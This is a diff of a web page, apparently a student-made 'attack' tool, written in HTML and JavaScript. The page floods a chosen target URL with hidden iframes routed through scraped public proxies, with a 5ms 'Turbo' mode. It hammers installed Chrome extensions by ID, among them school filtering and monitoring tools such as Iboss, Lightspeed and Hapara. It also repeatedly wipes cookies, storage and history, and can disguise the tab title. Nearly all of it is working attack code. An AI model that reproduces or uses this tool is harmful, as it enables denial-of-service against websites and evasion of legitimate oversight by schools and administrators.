@@ -5,162 +5,67 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Ronan is the SIGMA</title>
   <style>
-    body {
-      background: #000;
-      color: #0f0;
-      font-family: 'Courier New', Courier, monospace;
-      margin: 0;
-      padding: 0;
-      overflow-x: hidden;
-    }
-    .header {
-      display: flex;
-      background: #111;
-      padding: 10px;
-      justify-content: center;
-      gap: 10px;
-      border-bottom: 2px solid #0f0;
-    }
-    .tablink {
-      background: #111;
-      border: none;
-      color: #0f0;
-      padding: 10px 20px;
-      font-weight: bold;
-      cursor: pointer;
-      transition: background 0.3s, color 0.3s;
-      border-radius: 8px;
-    }
-    .tablink.active, .tablink:hover {
-      background: #0f0;
-      color: #000;
-    }
-    .tabcontent {
-      display: none;
-      padding: 20px;
-      animation: fadeIn 0.5s;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-    .container {
-      max-width: 900px;
-      margin: auto;
-      padding: 20px;
-    }
+    body { background: #000; color: #0f0; font-family: monospace; margin:0; padding:0; }
+    .header { display:flex; background:#111; padding:10px; position:sticky; top:0; z-index:10; }
+    .tablink { flex:1; background:#111; border:none; color:#0f0; padding:10px; cursor:pointer; }
+    .tablink.active { background:#0f0; color:#000; }
+    .tabcontent { display:none; padding:20px; }
+    .container { max-width:900px; margin:auto; }
     label, input, select, button, textarea, progress {
-      width: 100%;
-      margin-top: 10px;
-      padding: 10px;
-      background: #111;
-      color: #0f0;
-      border: 1px solid #0f0;
-      border-radius: 6px;
-      font-size: 16px;
+      width:100%; margin-top:10px; padding:8px;
+      background:#222; color:#0f0; border:1px solid #0f0; border-radius:4px;
     }
-    button {
-      font-weight: bold;
-      background: #0f0;
-      color: #000;
-      cursor: pointer;
-      transition: background 0.3s;
-    }
-    button:hover {
-      background: #0c0;
-    }
-    .scrollable {
-      max-height: 150px;
-      overflow-y: auto;
-      border: 1px solid #0f0;
-      padding: 5px;
-      background: #111;
-    }
-    .status {
-      margin-top: 10px;
-      font-weight: bold;
-      text-align: center;
-    }
+    button { font-weight:bold; background:#0f0; color:#000; cursor:pointer; }
+    button:hover { background:#0c0; }
+    .scrollable { max-height:150px; overflow-y:auto; }
+    .status { margin-top:10px; font-weight:bold; text-align:center; }
     #safeExitBtn {
-      position: fixed;
-      top: 10px;
-      right: 10px;
-      background: #f00;
-      color: #fff;
-      border: none;
-      padding: 10px;
-      border-radius: 6px;
-      z-index: 999;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    #introScreen {
-      position: fixed;
-      top: 0; left: 0; width: 100%; height: 100%;
-      background: #000;
-      color: #0f0;
-      font-family: 'Courier New', Courier, monospace;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column;
-      font-size: 24px;
-      z-index: 1000;
+      background:#f00; color:#fff; border:none; padding:12px; border-radius:4px;
+      width:100%; font-weight:bold; margin-top:20px; cursor:pointer;
     }
   </style>
 </head>
 <body>
 
-<div id="introScreen" onclick="skipIntro()">
-  <div id="introText"></div>
-  <small style="margin-top:20px;color:#0f0;">(Click to skip)</small>
-</div>
-
-<button id="safeExitBtn" onclick="safeExit()">Safe Exit</button>
-
 <div class="header">
-  <button class="tablink active" onclick="openTab('main', event)">Main Attack</button>
-  <button class="tablink" onclick="openTab('history', event)">History Deleter</button>
-  <button class="tablink" onclick="openTab('cloak', event)">Cloak</button>
+  <button class="tablink active" onclick="openTab('main')">Main Attack</button>
+  <button class="tablink" onclick="openTab('history')">History Deleter</button>
+  <button class="tablink" onclick="openTab('cloak')">Cloak</button>
+  <button class="tablink" onclick="openTab('turbo')">Turbo Mode</button>
 </div>
 
-<!-- Main Attack -->
-<div id="main" class="tabcontent" style="display: block;">
+<!-- MAIN ATTACK TAB -->
+<div id="main" class="tabcontent" style="display:block;">
   <div class="container">
-    <h2>Flood & Extension Killer</h2>
+    <h2>Flood & Extension Bugger</h2>
     <label>Target URL</label>
     <input type="text" id="targetUrl" value="https://example.com">
-
-    <label>Number of Iframes (cycles)</label>
+    <label>Number of Iframes</label>
     <input type="number" id="iframeCount" value="100" min="1">
-
-    <label>Delay Between Iframes (ms) (0 = Turbo)</label>
+    <label>Delay Between Iframes (ms)</label>
     <input type="number" id="iframeDelay" value="50" min="0">
-
     <label>Flood Mode</label>
     <select id="floodMode">
       <option value="aggressive">Ultra Aggressive</option>
       <option value="balanced">Balanced</option>
       <option value="silent">Silent Hidden</option>
     </select>
-
-    <label>Select Extensions to Attack</label>
+    <label>Select Extensions</label>
     <div class="scrollable">
       <select id="extensionDropdown" multiple></select>
     </div>
-
     <label>Manually Add Extension ID</label>
-    <input type="text" id="manualExtensionId" placeholder="Extension ID...">
+    <input type="text" id="manualExtensionId" placeholder="ID…">
     <button onclick="addManualExtension()">Add Extension</button>
-    <button onclick="scanExtensions()">Scan Installed Extensions</button>
+    <button onclick="scanExtensions()">Scan Extensions</button>
 
-    <h3>Proxy Settings (Auto-Fetch)</h3>
+    <h3>Proxy Settings</h3>
     <button onclick="fetchProxies()">Fetch Proxies</button>
     <div class="status" id="proxyStatus">Proxies loaded: 0</div>
     <label><input type="checkbox" id="enableProxyRotate" checked> Enable Proxy Rotation</label>
     <label><input type="checkbox" id="randomProxy" checked> Randomize Proxy Order</label>
 
-    <h3>Optional Features</h3>
+    <h3>Options</h3>
     <label><input type="checkbox" id="autoSelectBlockers" checked> Auto-Select Known Blockers</label>
     <label><input type="checkbox" id="smartRetry" checked> Enable Smart Retry</label>
     <label><input type="checkbox" id="showProgress" checked> Show Progress Bar</label>
@@ -177,18 +82,18 @@
   </div>
 </div>
 
-<!-- History Deleter -->
+<!-- HISTORY DELETER TAB -->
 <div id="history" class="tabcontent">
   <div class="container">
     <h2>History Deleter</h2>
-    <p>Attempts to clear history, cookies, cache, and storage using every available method.</p>
+    <p>Attempts every known method to clear cookies, storage, and browsing history repeatedly.</p>
     <button onclick="deleteHistory()">Delete All History</button>
     <button onclick="stopHistoryDeletion()">Stop Attempts</button>
     <div class="status" id="statusHistory">Status: Idle</div>
   </div>
 </div>
 
-<!-- Cloak -->
+<!-- CLOAK TAB -->
 <div id="cloak" class="tabcontent">
   <div class="container">
     <h2>Cloak Disguise</h2>
@@ -201,48 +106,55 @@
       <option value="blank">Blank Page</option>
       <option value="custom">Custom URL</option>
     </select>
-    <input type="text" id="cloakCustomUrl" placeholder="https://... (for Custom)">
+    <input type="text" id="cloakCustomUrl" placeholder="https://… (for Custom)">
     <button onclick="applyCloak()">Apply Cloak</button>
   </div>
 </div>
 
-<script>
-// INTRO SCREEN
-let introText = "Ronan is the SIGMA";
-let currentChar = 0;
-function typeIntro(){
-  if(currentChar < introText.length){
-    document.getElementById('introText').innerText += introText[currentChar++];
-    setTimeout(typeIntro, 100);
-  } else {
-    setTimeout(()=>document.getElementById('introScreen').style.display='none',500);
-  }
-}
-function skipIntro(){
-  document.getElementById('introScreen').style.display='none';
-}
-window.onload = typeIntro;
+<!-- TURBO MODE TAB -->
+<div id="turbo" class="tabcontent">
+  <div class="container">
+    <h2>⚡ Turbo Mode ⚡</h2>
+    <p>Mass-spawns iframes EXTREMELY fast. Use carefully.</p>
+    <button onclick="startTurbo()">Start Turbo Attack</button>
+    <button onclick="stopTurbo()">Stop Turbo</button>
+    <div class="status" id="statusTurbo">Status: Idle</div>
+  </div>
+</div>
 
-// TABS
-function openTab(id, event){
-  document.querySelectorAll('.tabcontent').forEach(tc => tc.style.display='none');
+<!-- SAFE EXIT BUTTON -->
+<div class="container">
+  <button id="safeExitBtn" onclick="safeExit()">Safe Exit (Stop Everything)</button>
+</div>
+
+<script>
+//--- Core Settings ---
+let proxies = [];
+let flooding = false, iframeInterval, frameCounter = 0;
+let historyInterval;
+let turboInterval;
+
+//--- Tab Switching ---
+function openTab(id) {
+  document.querySelectorAll('.tabcontent').forEach(tc => tc.style.display = 'none');
   document.querySelectorAll('.tablink').forEach(tb => tb.classList.remove('active'));
-  document.getElementById(id).style.display='block';
+  document.getElementById(id).style.display = 'block';
   event.currentTarget.classList.add('active');
 }
 
-// SAFE EXIT
-function safeExit(){
+//--- Safe Exit ---
+function safeExit() {
   killSwitch();
   stopFlood();
   stopHistoryDeletion();
+  stopTurbo();
   window.location.reload();
 }
 
-// EXTENSION MANAGEMENT
+//--- Extensions ---
 let extensionList = {
   "gighmmpiobklfepjocnamgkkbiglidom":"AdBlock",
-  "cfhdojbkjhnklbpkdaibdccddilifddb":"Adblock Plus",
+  "cfhdojbkjhnklbpkdaibdccddilifddb":"AdblockPlus",
   "nkeimhogjdpnpccoofpliimaahmaaome":"Grammarly",
   "ibnejdfjmmkpcnlpebklmnkoeoihofec":"uBlock Origin",
   "lfnaojkojhopbjbpmloofpnjkcjnkddd":"Iboss",
@@ -252,53 +164,53 @@ let extensionList = {
   "dklfdjmcoelnopogcfbglboogcgpjbfi":"Lightspeed",
   "ldnnhddmnhbkjipkidpdiheffobcpfmf":"Hapara"
 };
-function populateDropdown(){
+
+function populateDropdown() {
   const dd = document.getElementById('extensionDropdown');
   dd.innerHTML = '';
-  for(let id in extensionList){
+  for (let id in extensionList) {
     const opt = document.createElement('option');
     opt.value = id;
-    opt.textContent = extensionList[id] + " (" + id + ")";
+    opt.textContent = `${extensionList[id]} (${id})`;
     dd.appendChild(opt);
   }
 }
 function addManualExtension(){
-  const id = document.getElementById('manualExtensionId').value.trim();
+  const id=document.getElementById('manualExtensionId').value.trim();
   if(id && !extensionList[id]){
-    extensionList[id] = prompt("Name this extension:", "Unknown Extension") || "Unknown Extension";
+    extensionList[id]='Unknown Extension';
     populateDropdown();
-    document.getElementById('manualExtensionId').value = '';
+    document.getElementById('manualExtensionId').value='';
   }
 }
 function scanExtensions(){
   for(let id in extensionList){
-    const iframe = document.createElement('iframe');
-    iframe.src = `chrome-extension://${id}/_generated_background_page.html`;
-    iframe.style.display = 'none';
+    const iframe=document.createElement('iframe');
+    iframe.src=`chrome-extension://${id}/_generated_background_page.html`;
+    iframe.style.display='none';
     document.body.appendChild(iframe);
-    iframe.onload = ()=>{ iframe.remove(); };
-    setTimeout(()=>iframe.remove(), 1000);
+    setTimeout(()=>iframe.remove(),1000);
   }
 }
 
-// PROXY FETCH
-let proxies = [];
-function fetchProxies(){
-  document.getElementById('proxyStatus').innerText = 'Fetching...';
+//--- Proxy Fetch ---
+function fetchProxies() {
+  document.getElementById('proxyStatus').innerText = 'Fetching…';
   fetch('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=2000&country=all&ssl=all&anonymity=all')
-    .then(r => r.text())
-    .then(txt => {
-      proxies = txt.split('\n').map(p=>p.trim()).filter(Boolean);
-      document.getElementById('proxyStatus').innerText = 'Proxies loaded: ' + proxies.length;
-    }).catch(()=>{
-      document.getElementById('proxyStatus').innerText = 'Proxy fetch failed.';
-    });
+  .then(r => r.text())
+  .then(txt => {
+    proxies = txt.split('\n').map(p=>p.trim()).filter(p=>p);
+    document.getElementById('proxyStatus').innerText = 'Proxies loaded: ' + proxies.length;
+  })
+  .catch(err=>{
+    console.error(err);
+    document.getElementById('proxyStatus').innerText = 'Proxy fetch failed';
+  });
 }
 
-// FLOOD ENGINE
-let flooding = false, iframeInterval, frameCounter = 0;
-function startFlood(){
-  if(flooding) return;
+//--- Flood Attack ---
+function startFlood() {
+  if (flooding) return;
   flooding = true; frameCounter = 0;
   const count = +document.getElementById('iframeCount').value;
   const delay = +document.getElementById('iframeDelay').value;
@@ -306,47 +218,50 @@ function startFlood(){
   const smart = document.getElementById('smartRetry').checked;
   const rotate = document.getElementById('enableProxyRotate').checked;
   const randomP = document.getElementById('randomProxy').checked;
-  let exts = Array.from(document.getElementById('extensionDropdown').selectedOptions).map(o => o.value);
-  if(!exts.length) { alert('Select at least one extension!'); flooding=false; return; }
-  if(randomP) proxies.sort(()=>Math.random()-0.5);
-  document.getElementById('statusMain').innerText='Status: Flooding...';
-  iframeInterval = setInterval(()=>{
-    if(!flooding || frameCounter >= count) { stopFlood(); return; }
+  const exts = Array.from(document.getElementById('extensionDropdown').selectedOptions).map(o=>o.value);
+  if (!exts.length){ alert('Select at least one extension!'); flooding=false; return; }
+  document.getElementById('statusMain').innerText = 'Status: Flooding...';
+  if (randomP) proxies.sort(()=>Math.random()-0.5);
+
+  iframeInterval = setInterval(() => {
+    if (!flooding || frameCounter >= count){ stopFlood(); return; }
     spawnIframe(document.getElementById('targetUrl').value, mode, rotate, smart);
-    exts.forEach(id=>spawnExtIframe(id));
+    exts.forEach(id => spawnExtIframe(id));
     frameCounter++;
-    if(document.getElementById('showProgress').checked){
-      document.getElementById('progressContainer').style.display='block';
+    if (document.getElementById('showProgress').checked) {
+      document.getElementById('progressContainer').style.display = 'block';
       document.getElementById('attackProgress').value = (frameCounter/count)*100;
     }
   }, delay);
 }
-function stopFlood(){
-  flooding = false;
-  clearInterval(iframeInterval);
-  document.getElementById('statusMain').innerText = 'Status: Stopped.';
-  document.getElementById('progressContainer').style.display = 'none';
+function stopFlood() {
+  flooding=false; clearInterval(iframeInterval);
+  document.getElementById('statusMain').innerText = 'Status: Stopped';
+  document.getElementById('progressContainer').style.display='none';
 }
-function killSwitch(){
+function killSwitch() {
   stopFlood();
-  document.querySelectorAll('iframe').forEach(f => f.remove());
+  document.querySelectorAll('iframe').forEach(f=>f.remove());
   document.getElementById('statusMain').innerText = 'Status: Killed.';
 }
-function spawnIframe(url, mode, rotate, smart){
+function spawnIframe(url, mode, rotate, smart) {
   let proxy = '';
-  if(rotate && proxies.length) proxy = 'http://' + proxies[Math.floor(Math.random()*proxies.length)] + '/';
+  if (rotate && proxies.length) {
+    proxy = proxies[Math.floor(Math.random()*proxies.length)] + '/';
+  }
   const src = proxy + url + '?r=' + Math.random();
   const f = document.createElement('iframe');
-  f.src = src;
-  f.style.border = 'none';
-  f.style.width = mode==='silent'?'0':'10px';
-  f.style.height = mode==='silent'?'0':'10px';
-  if(mode==='silent') f.style.visibility='hidden';
+  f.src = src; f.style.border = 'none';
+  switch(mode){
+    case 'aggressive': f.style.width='1px'; f.style.height='1px'; break;
+    case 'balanced': f.style.width='10px'; f.style.height='10px'; break;
+    case 'silent': f.style.width='0'; f.style.height='0'; f.style.visibility='hidden'; break;
+  }
   document.body.appendChild(f);
-  f.onload = ()=>{ if(!flooding) f.remove(); };
-  f.onerror = ()=>{ f.remove(); if(flooding && smart) spawnIframe(url, mode, rotate, smart); };
+  f.onload=()=>{ if (!flooding) f.remove(); };
+  f.onerror=()=>{ f.remove(); if(flooding && smart) spawnIframe(url, mode, rotate, smart); };
 }
-function spawnExtIframe(id){
+function spawnExtIframe(id) {
   const f = document.createElement('iframe');
   f.style.display = 'none';
   f.src = `chrome-extension://${id}/`;
@@ -354,13 +269,12 @@ function spawnExtIframe(id){
   setTimeout(()=>f.remove(),500);
 }
 
-// HISTORY DELETER
-let historyInterval;
+//--- History Deleter ---
 function deleteHistory(){
   stopHistoryDeletion();
+  document.getElementById('statusHistory').innerText='Status: Deleting...';
   clearAllData();
   historyInterval = setInterval(clearAllData, 500);
-  document.getElementById('statusHistory').innerText='Status: Deleting...';
 }
 function stopHistoryDeletion(){
   clearInterval(historyInterval);
@@ -368,45 +282,51 @@ function stopHistoryDeletion(){
 }
 function clearAllData(){
   document.cookie.split(';').forEach(c=>{
-    document.cookie=c.replace(/^ +/,'').replace(/=.*/,'')+'=;expires=Thu,01 Jan 1970 00:00:00 UTC;path=/';
+    document.cookie = c.replace(/^ +/,'').replace(/=.*/,'')+'=;expires=Thu,01 Jan 1970 00:00:00 GMT;path=/';
   });
   localStorage.clear();
   sessionStorage.clear();
-  try{
-    chrome.browsingData.remove({}, {history:true,cookies:true,localStorage:true,cache:true},()=>{});
-  }catch(e){}
-  const fi = document.createElement('iframe');
-  fi.style.display='none';
-  fi.src = 'chrome://settings/clearBrowserData';
-  document.body.appendChild(fi);
-  setTimeout(()=>fi.remove(),2000);
+  try{ chrome.browsingData.remove({}, {history:true, cookies:true, localStorage:true, cache:true}, ()=>{}); }catch(e){}
 }
 
-// CLOAK
+//--- Cloak ---
 function applyCloak(){
   const mode = document.getElementById('cloakMode').value;
   const url = document.getElementById('cloakCustomUrl').value.trim();
+  let fakeTitle = 'Loading...';
   switch(mode){
-    case 'google-docs': window.location.href='https://docs.google.com/document/u/0/'; break;
-    case 'google-drive': window.location.href='https://drive.google.com/drive/my-drive'; break;
-    case 'calculator':
-      document.body.innerHTML='<iframe src="https://www.google.com/search?q=calculator" style="border:none;width:100%;height:100vh;"></iframe>';
-      break;
-    case 'notepad':
-      document.body.innerHTML='<textarea style="width:100%;height:100vh;background:#fff;color:#000;"></textarea>';
-      break;
-    case 'blank':
-      document.body.innerHTML='';
-      break;
-    case 'custom':
-      if(url) window.location.href=url;
-      break;
+    case 'google-docs': fakeTitle = 'Google Docs'; break;
+    case 'google-drive': fakeTitle = 'Google Drive'; break;
+    case 'calculator': fakeTitle = 'Calculator'; break;
+    case 'notepad': fakeTitle = 'Notepad'; break;
+    case 'blank': fakeTitle = 'Blank Page'; break;
+    case 'custom': fakeTitle = url || 'Custom'; break;
   }
+  document.title = fakeTitle;
 }
 
-// INIT
+//--- Turbo Mode ---
+function startTurbo(){
+  if (turboInterval) return;
+  document.getElementById('statusTurbo').innerText = 'Status: Turbo Flooding...';
+  turboInterval = setInterval(() => {
+    const f = document.createElement('iframe');
+    f.src = document.getElementById('targetUrl').value + '?r=' + Math.random();
+    f.style.display='none';
+    document.body.appendChild(f);
+    setTimeout(()=>f.remove(), 2000);
+  }, 5); // 5ms interval = extreme
+}
+function stopTurbo(){
+  clearInterval(turboInterval);
+  document.getElementById('statusTurbo').innerText = 'Status: Stopped';
+  turboInterval = null;
+}
+
+//--- Init ---
 populateDropdown();
 fetchProxies();
+
 </script>
 
 </body>
